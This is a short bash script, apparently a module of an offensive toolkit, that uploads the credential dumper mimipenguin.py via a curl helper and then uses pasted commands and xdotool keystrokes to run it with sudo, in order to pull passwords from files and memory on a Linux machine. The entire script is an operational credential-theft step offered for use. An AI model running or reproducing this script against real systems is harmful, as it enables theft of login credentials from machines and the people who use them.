#!/bin/bash

: '
download mimipenguin.py and find credentials in files and memory (root required)
'

LOCATION="${SCRIPTS_DIR}/reconnaissance/linux/.files"
FILE="mimipenguin.py"

curl_upload_file "${LOCATION}" "${FILE}"
sleep 3

paste_command "sudo python3 mimipenguin.py"
xdotool key Return
